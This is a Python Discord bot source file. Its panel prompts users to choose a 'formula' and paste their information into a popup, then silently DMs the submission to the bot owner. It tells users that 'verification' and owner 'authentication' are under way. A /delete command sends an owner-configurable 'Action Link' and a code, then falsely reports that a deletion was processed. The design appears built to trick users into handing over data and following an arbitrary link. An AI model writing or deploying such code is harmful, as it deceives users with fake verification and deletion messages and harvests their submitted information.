import os
import json
import random
import string
import discord
from discord import app_commands
from discord.ext import commands
from keep_alive import keep_alive

# Setup Bot and Intents
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents)

FORMULA_FILE = "formulas.json"
LINK_FILE = "link.txt"

# --- LIGHTNING FAST MEMORY CACHE ---
# This keeps data in RAM so it loads instantly without disk lag
cached_formulas = ["Formula A", "Formula B", "Formula C", "Formula D"]
cached_delete_link = "https://your-default-link.com"

# --- DATABASE LOGIC (RUNS IN BACKGROUND) ---
def load_data_into_memory():
    global cached_formulas, cached_delete_link
    
    # Load formulas
    if os.path.exists(FORMULA_FILE):
        try:
            with open(FORMULA_FILE, "r") as f:
                cached_formulas = json.load(f)
        except Exception as e:
            print(f"Error reading formulas file: {e}")
            
    # Load link
    if os.path.exists(LINK_FILE):
        try:
            with open(LINK_FILE, "r") as f:
                cached_delete_link = f.read().strip()
        except Exception as e:
            print(f"Error reading link file: {e}")

def save_formulas(options_list):
    global cached_formulas
    cached_formulas = options_list  # Update memory instantly
    try:
        with open(FORMULA_FILE, "w") as f:
            json.dump(options_list, f)
    except Exception as e:
        print(f"Failed to write formulas file: {e}")

def save_delete_link(new_link):
    global cached_delete_link
    cached_delete_link = new_link.strip()  # Update memory instantly
    try:
        with open(LINK_FILE, "w") as f:
            f.write(new_link.strip())
    except Exception as e:
        print(f"Failed to write link file: {e}")


# --- THE TEXT BOX POP-UP ---
class FormulaInputModal(discord.ui.Modal):
    def __init__(self, selected_formula: str):
        super().__init__(title=f"Applying: {selected_formula}")
        self.selected_formula = selected_formula

        self.user_input = discord.ui.TextInput(
            label="Paste your input here:",
            style=discord.TextStyle.paragraph,
            placeholder="Type or paste your information...",
            required=True,
            max_length=2000
        )
        self.add_item(self.user_input)

    async def on_submit(self, interaction: discord.Interaction):
        # 1. Instantly respond to stop timeout errors
        await interaction.response.send_message(
            "Verifying that this is real. This could take up to 2 hours.", 
            ephemeral=True
        )

        # 2. DM the Bot Owner (You)
        try:
            owner = await bot.fetch_user(bot.owner_id)
            dm_embed = discord.Embed(
                title="📥 New Formula Submission", 
                color=discord.Color.green()
            )
            dm_embed.add_field(name="User", value=f"{interaction.user.mention} ({interaction.user.name})", inline=False)
            dm_embed.add_field(name="Selected Formula", value=self.selected_formula, inline=False)
            dm_embed.add_field(name="Submitted Data", value=self.user_input.value, inline=False)
            
            await owner.send(embed=dm_embed)
        except Exception as e:
            print(f"Could not DM owner. Error: {e}")


# --- THE DROPDOWN SELECT MENU ---
class FormulaSelect(discord.ui.Select):
    def __init__(self):
        # Grabs straight from fast RAM cache instead of reading disk
        options = [discord.SelectOption(label=opt, description=f"Select {opt}") for opt in cached_formulas]
        super().__init__(placeholder="Choose a formula...", min_values=1, max_values=1, options=options)

    async def callback(self, interaction: discord.Interaction):
        await interaction.response.send_modal(FormulaInputModal(self.values[0]))


# --- BUTTON FOR DM INSTRUCTIONS ---
class InstructionsButton(discord.ui.Button):
    def __init__(self):
        super().__init__(label="Get Instructions 📖", style=discord.ButtonStyle.secondary)

    async def callback(self, interaction: discord.Interaction):
        try:
            await interaction.user.send(
                "📝 **Here are your layout instructions:**\n"
                "1. Select your target formula choice from the server's dropdown menu.\n"
                "2. Paste your data directly into the modal popup that appears.\n"
                "3. Wait for the owner to finalize authentication in your DMs within 2 hours."
            )
            await interaction.response.send_message("✅ Instructions sent to your DMs!", ephemeral=True)
        except discord.Forbidden:
            await interaction.response.send_message("❌ Cannot DM you. Please toggle open your server privacy settings!", ephemeral=True)


# --- COMBINED PANEL VIEW ---
class PanelView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)
        self.add_item(FormulaSelect())       
        self.add_item(InstructionsButton())  


# --- THE DELETE CONFIRMATION MODAL ---
class DeleteVerifyModal(discord.ui.Modal):
    def __init__(self, correct_code: str):
        super().__init__(title="Verification Required")
        self.correct_code = correct_code

        self.user_code = discord.ui.TextInput(
            label="Paste the verification code here:",
            style=discord.TextStyle.short,
            placeholder="Paste code from DM...",
            required=True
        )
        self.add_item(self.user_code)

    async def on_submit(self, interaction: discord.Interaction):
        if self.user_code.value.strip() == self.correct_code:
            await interaction.response.send_message("✅ Verification successful. Request deletion processed.", ephemeral=True)
        else:
            await interaction.response.send_message("❌ Incorrect code. Request cancelled.", ephemeral=True)


# --- BOT EVENTS & COMMANDS ---
@bot.event
async def on_ready():
    print(f'Logged in as {bot.user.name}')
    
    # Pre-load files into RAM immediately when starting up
    load_data_into_memory()
    print("Database loaded securely into memory cache.")
    
    if bot.owner_id is None:
        app = await bot.application_info()
        bot.owner_id = app.owner.id
    
    try:
        await bot.tree.sync()
        print("Synced slash commands.")
    except Exception as e:
        print(f"Sync failed: {e}")

# Command 1: Public Combined Panel (Instantly pulls from memory cache)
@bot.hybrid_command(name="panel", description="Opens up the formula selection and instructions panel.")
async def panel(ctx: commands.Context):
    await ctx.send("What formula do you want to do?", view=PanelView())

# Command 2: Change Options (Owner Only)
@bot.hybrid_command(name="setformulas", description="Owner only: Update and save the 4 choices.")
@app_commands.describe(opt1="Option 1", opt2="Option 2", opt3="Option 3", opt4="Option 4")
async def setformulas(ctx: commands.Context, opt1: str, opt2: str, opt3: str, opt4: str):
    if ctx.author.id != bot.owner_id:
        await ctx.send("❌ You are not authorized to use this command.", ephemeral=True)
        return
        
    save_formulas([opt1, opt2, opt3, opt4])
    await ctx.send(f"✅ Formulas permanently updated to:\n1. {opt1}\n2. {opt2}\n3. {opt3}\n4. {opt4}", ephemeral=True)

# Command 3: Change Delete Link (Owner Only)
@bot.hybrid_command(name="setlink", description="Owner only: Update the URL link sent during /delete commands.")
@app_commands.describe(new_url="The new website URL link")
async def setlink(ctx: commands.Context, new_url: str):
    if ctx.author.id != bot.owner_id:
        await ctx.send("❌ You are not authorized to use this command.", ephemeral=True)
        return
        
    save_delete_link(new_url)
    await ctx.send(f"✅ Secure deletion link permanently updated to:\n`{new_url}`", ephemeral=True)

# Command 4: Delete Command with Link + DM Code Verification (Public)
@bot.hybrid_command(name="delete", description="Initiate a secure deletion process.")
async def delete(ctx: commands.Context):
    code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
    
    try:
        await ctx.author.send(
            f"⚠️ **Deletion Request Initialized**\n\n"
            f"🔗 **Action Link:** {cached_delete_link}\n"
            f"🔑 **Your Required Code:** `{code}`\n\n"
            f"Paste this code back into the popup screen on the server to finish validation."
        )
        
        modal = DeleteVerifyModal(correct_code=code)
        await ctx.interaction.response.send_modal(modal)
    except discord.Forbidden:
        await ctx.send("❌ I cannot send you a DM. Please check your privacy settings and try again.", ephemeral=True)

keep_alive()
bot.run(os.environ.get('DISCORD_TOKEN'))
